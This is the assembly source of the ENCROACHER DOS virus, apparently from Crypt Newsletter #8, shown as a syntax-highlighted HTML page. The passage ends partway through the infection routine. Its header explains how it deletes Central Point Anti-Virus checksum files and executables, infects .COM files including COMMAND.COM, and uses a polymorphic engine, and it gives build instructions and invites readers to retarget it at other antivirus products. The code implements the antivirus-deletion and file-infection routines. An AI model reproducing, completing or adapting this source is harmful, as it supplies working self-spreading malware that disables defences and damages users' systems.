<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ENCROACH.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">; The ENCROACHER virus: Incorporating anti-virus software countermeasures</span><span class="sc0">
</span><span class="sc1">; to aid in gaining and maintaining a foothold on a CENTRAL POINT ANTIVIRUS</span><span class="sc0">
</span><span class="sc1">; protected system. Some of the ideas in ENCROACHER were inspired by Mark</span><span class="sc0">
</span><span class="sc1">; Ludwig's RETALIATOR virus (American Eagle Publishing) and Nowhere Man's</span><span class="sc0">
</span><span class="sc1">; VCL 1.0 viral assembly code library. ENCROACHER also utilizes the Mutation</span><span class="sc0">
</span><span class="sc1">; Engine for polymorphism. Edited by URNST KOUCH for Crypt Newsletter #8.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  1. Assemble with TASM 2.5 with the aid of MAKE.BAT, included in issue #8.</span><span class="sc0">
</span><span class="sc1">;  2. The reader must also have the MtE091b object files (not included in </span><span class="sc0">
</span><span class="sc1">;  the newsletter but commonly available as the Mutation Engine at most</span><span class="sc0">
</span><span class="sc1">;  good virus info archive sites.) </span><span class="sc0">
</span><span class="sc1">;  3. Place all files in ENCROACHER assembly directory. </span><span class="sc0">
</span><span class="sc1">;  4. Execute MAKE.BAT with TASM 2.5 and TLINK.EXE in path.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ENCROACHER is a simple .COM appending virus which strikes the Central Point</span><span class="sc0">
</span><span class="sc1">; Anti-virus software in a direct manner.  CPAV stores a file called </span><span class="sc0">
</span><span class="sc1">; chklist.cps in every directory that contains executable programs. This file</span><span class="sc0">
</span><span class="sc1">; contains the integrity (or checksum) data on each program in that</span><span class="sc0">
</span><span class="sc1">; directory. It is the library file that CPAV refers to when scanning for</span><span class="sc0">
</span><span class="sc1">; unknown viruses. By comparing 'newly checksummed' files with its data </span><span class="sc0">
</span><span class="sc1">; in chklist.cps, CPAV locates change, corruption or generic virus infection.</span><span class="sc0">
</span><span class="sc1">; Eliminating these files before virus infection forces Central Point </span><span class="sc0">
</span><span class="sc1">; Antivirus to create new 'checklist' data for the directory, AFTER the</span><span class="sc0">
</span><span class="sc1">; virus has acted.  Therefore, the virus-infected file becomes</span><span class="sc0">
</span><span class="sc1">; a legal part of Central Point's freshly calculated integrity data.</span><span class="sc0">
</span><span class="sc1">; Upon call, ENCROACHER will ALWAYS check for and erase these files, forcing</span><span class="sc0">
</span><span class="sc1">; the anti-virus software to constantly update its data, effectively</span><span class="sc0">
</span><span class="sc1">; making this feature unreliable.  In my experience,</span><span class="sc0">
</span><span class="sc1">; the CPAV software does not protest the elimination of these files in an</span><span class="sc0">
</span><span class="sc1">; appropriate manner.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ENCROACHER will also attempt to erase the main CENTRAL POINT A-V program        </span><span class="sc0">
</span><span class="sc1">; in its default installation directory before infection.  This is a </span><span class="sc0">
</span><span class="sc1">; direct attack and is more likely to be noticed than the</span><span class="sc0">
</span><span class="sc1">; disappearance and reappearance of dozens of very small chklist.cps</span><span class="sc0">
</span><span class="sc1">; files. Because it is a strong move, one can be of mixed mind about using it.</span><span class="sc0">
</span><span class="sc1">; An alert user SHOULD recognize something wrong almost immediately. </span><span class="sc0">
</span><span class="sc1">; However, it is included to illustrate the point that while it presumes </span><span class="sc0">
</span><span class="sc1">; apriori knowledge concerning the location of CPAV software on the system,  </span><span class="sc0">
</span><span class="sc1">; many users can STILL be expected to be lazy (and/or stupid) and use the </span><span class="sc0">
</span><span class="sc1">; vulnerable shrink-wrapped software recommendations for installation.</span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">; ENCROACHER will also target and delete VSAFE.COM, CPAV's most powerful       </span><span class="sc0">
</span><span class="sc1">; program for the detection of virus-mediated opening, closing and writing</span><span class="sc0">
</span><span class="sc1">; to files. (The CPAV software also contains VSAFE as a device, VSAFE.SYS.</span><span class="sc0">
</span><span class="sc1">; The user may add attack of this component to the source code if he wishes.)</span><span class="sc0">
</span><span class="sc1">; If Central Point's DEFAULT installation is in place and VSAFE is in        </span><span class="sc0">
</span><span class="sc1">; memory, ENCROACHER will remove it since, generally, the program</span><span class="sc0">
</span><span class="sc1">; is merely configured to scan for known viruses, add chklist.cps files</span><span class="sc0">
</span><span class="sc1">; to program directories and lock out writes to the boot record. If all</span><span class="sc0">
</span><span class="sc1">; of VSAFE's features are enabled, ENCROACHER WILL BE detected when it</span><span class="sc0">
</span><span class="sc1">; attempts to destroy VSAFE. However, since these VSAFE features are</span><span class="sc0">
</span><span class="sc1">; not practical for everyday computing needs, it can be</span><span class="sc0">
</span><span class="sc1">; assumed relatively safe to disregard them as a threat to ENCROACHER. (The</span><span class="sc0">
</span><span class="sc1">; reader is invited to add a routine which will make a call to VSAFE</span><span class="sc0">
</span><span class="sc1">; if in memory. If VSAFE is resident, the routine could be written to</span><span class="sc0">
</span><span class="sc1">; instruct the virus to go to sleep until the danger is past.)</span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">; Central Point Anti-virus contains a third program known as VWATCH. It</span><span class="sc0">
</span><span class="sc1">; can be safely ignored by ENCROACHER.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ENCROACHER's anti-virus software countermeasures can be quickly adapted</span><span class="sc0">
</span><span class="sc1">; to almost any commercial software of choice.  Access to manuals or</span><span class="sc0">
</span><span class="sc1">; copies of the Norton Antivirus, Fifth Generation's Untouchable or</span><span class="sc0">
</span><span class="sc1">; Leprechaun Software's Virus-Buster have all the information needed to</span><span class="sc0">
</span><span class="sc1">; allow the homebrew researcher to reconfigure the virus so that it can </span><span class="sc0">
</span><span class="sc1">; attack these programs in an educated manner.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ENCROACHER2 is a variant of ENCROACHER supplied as a DEBUG script. </span><span class="sc0">
</span><span class="sc1">; In addition to it's anti- CPAV capability, ENCROACHER2 will poison selected</span><span class="sc0">
</span><span class="sc1">; programs sometime in the evening hours.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; General features: ENCROACHER will infect all .COM programs in its current </span><span class="sc0">
</span><span class="sc1">; directory. When finished, it will jump to the root of the current directory</span><span class="sc0">
</span><span class="sc1">; and continue its work.</span><span class="sc0">
</span><span class="sc1">; ENCROACHER WILL NOT restore the DTA, producing a shift at the prompt. </span><span class="sc0">
</span><span class="sc1">; (Sorry, deadline was approaching for the newsletter and I had to get this</span><span class="sc0">
</span><span class="sc1">; baby to bed.) </span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">; ENCROACHER has no problem infecting COMMAND.COM or NDOS.COM!  The operating</span><span class="sc0">
</span><span class="sc1">; system WILL continue to load properly. ENCROACHER quickly deletes</span><span class="sc0">
</span><span class="sc1">; Central Point software programs on start-up. There is no noticeable</span><span class="sc0">
</span><span class="sc1">; delay in infection times between it and a copy of the virus lacking </span><span class="sc0">
</span><span class="sc1">; these features.</span><span class="sc0">
</span><span class="sc1">; ENCROACHER will quickly infect down the trunk of any directory structure.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Keep in mind, that ENCROACHER 2 can be frustratingly destructive once</span><span class="sc0">
</span><span class="sc1">; it has spread out onto a system.</span><span class="sc0">
    
    
    </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc9">.radix</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0">

    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">mut_engine</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rnd_init</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">rnd_buf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">data_top</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">

    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">locadr</span><span class="sc0">
</span><span class="sc5">reladr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ENCROACHER is here'</span><span class="sc0">
       
</span><span class="sc5">locadr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Calculate new CS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_cod</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">;Restore first 3 bytes</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta_buf</span><span class="sc0">       </span><span class="sc1">;Set DTA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1a</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524</span><span class="sc0">                 </span><span class="sc1">;Hook INT 24</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fail_err</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">killcps</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; clear CPS integrity files from startup directory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">killfile</span><span class="sc0">      </span><span class="sc1">; DX points to data mask: chklist.cps</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Eh</span><span class="sc0">                 </span><span class="sc1">; DOS find first file function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100111b</span><span class="sc0">            </span><span class="sc1">; All file attributes valid</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">erase_done</span><span class="sc0">              </span><span class="sc1">; Exit procedure on failure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Fh</span><span class="sc0">                 </span><span class="sc1">; DOS get DTA function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; DX points to filename in DTA</span><span class="sc0">
</span><span class="sc5">erase_loop</span><span class="sc4">:</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">                 </span><span class="sc1">; DOS delete file function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc0">                 </span><span class="sc1">; DOS create file function</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; No attributes for new file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">                 </span><span class="sc1">; DOS delete file function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc0">                 </span><span class="sc1">; DOS find next file function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">erase_loop</span><span class="sc0">              </span><span class="sc1">; Repeat until no files left</span><span class="sc0">
</span><span class="sc5">erase_done</span><span class="sc4">:</span><span class="sc0">


     </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">killcpav</span><span class="sc0">               </span><span class="sc1">; chklist.cps gone, go for CPAV.EXE</span><span class="sc0">
                    </span><span class="sc1">; in factory installation</span><span class="sc0">
    
    
</span><span class="sc5">killcpav</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; clear CPAV master executable from default directory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">killfile2</span><span class="sc0">    </span><span class="sc1">; DX points to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; DOS erase file function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">killvsafe</span><span class="sc0">

</span><span class="sc5">killvsafe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">killfile3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">erase_done2</span><span class="sc0">

</span><span class="sc5">erase_done2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getonwithit</span><span class="sc0">
    
</span><span class="sc5">getonwithit</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;get on with infecting files</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;Initialize random number generator</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">rnd_buf</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;for Mutation Engine use</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_init</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">find_lup1</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">srchnam</span><span class="sc0">       </span><span class="sc1">;COMfile mask for clean file search</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4e</span><span class="sc0">                   </span><span class="sc1">;find a file</span><span class="sc0">

</span><span class="sc5">find_lup2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">        </span><span class="sc1">;Find the next COM file</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ch_dir</span><span class="sc0">    </span><span class="sc1">;if no files or no uninfected files in current dir, change to root</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dta_buf</span><span class="sc4">+</span><span class="sc2">1a</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">           </span><span class="sc1">;If not infected, infect it now</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">find_nxt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta_buf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4f</span><span class="sc0">                 </span><span class="sc1">;found an infected file, find another</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_lup2</span><span class="sc0">

</span><span class="sc5">ch_dir</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dotdot</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">              </span><span class="sc1">; Change directory to root of current</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">find_lup1</span><span class="sc0">           </span><span class="sc1">; Carry set if in root</span><span class="sc0">
                    </span><span class="sc1">; loop to search for clean files</span><span class="sc0">
</span><span class="sc5">infect_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">find_nxt</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">exit2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">             </span><span class="sc1">;extraneous garbage code</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;   "         "      "</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit2</span><span class="sc0">               </span><span class="sc1">;   "         "      "</span><span class="sc0">

</span><span class="sc5">exit1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popf</span><span class="sc0">                       </span><span class="sc1">;return control and get set to clean up</span><span class="sc0">

</span><span class="sc5">exit2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524</span><span class="sc0">             </span><span class="sc1">;Restore old INT 24</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                   </span><span class="sc1">;Restore DTA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1a</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;Exit to host program</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Reset read-only attribute</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta_buf</span><span class="sc4">+</span><span class="sc2">1e</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_done</span><span class="sc0">             </span><span class="sc1">;if fail, get set to leave</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02</span><span class="sc0">                 </span><span class="sc1">;Open the file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_done</span><span class="sc0">             </span><span class="sc1">;if fail, get set to leave</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_cod</span><span class="sc0">       </span><span class="sc1">;Read first 3 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3f</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">read_done</span><span class="sc0">               </span><span class="sc1">;file already infected, skip it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_cod</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Make sure it's not an EXE file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">read_done</span><span class="sc0">               </span><span class="sc1">;if it is, skip it</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">read_done</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Seek to end of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Make sure the file is not too big</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">read_done</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">2000</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_done</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
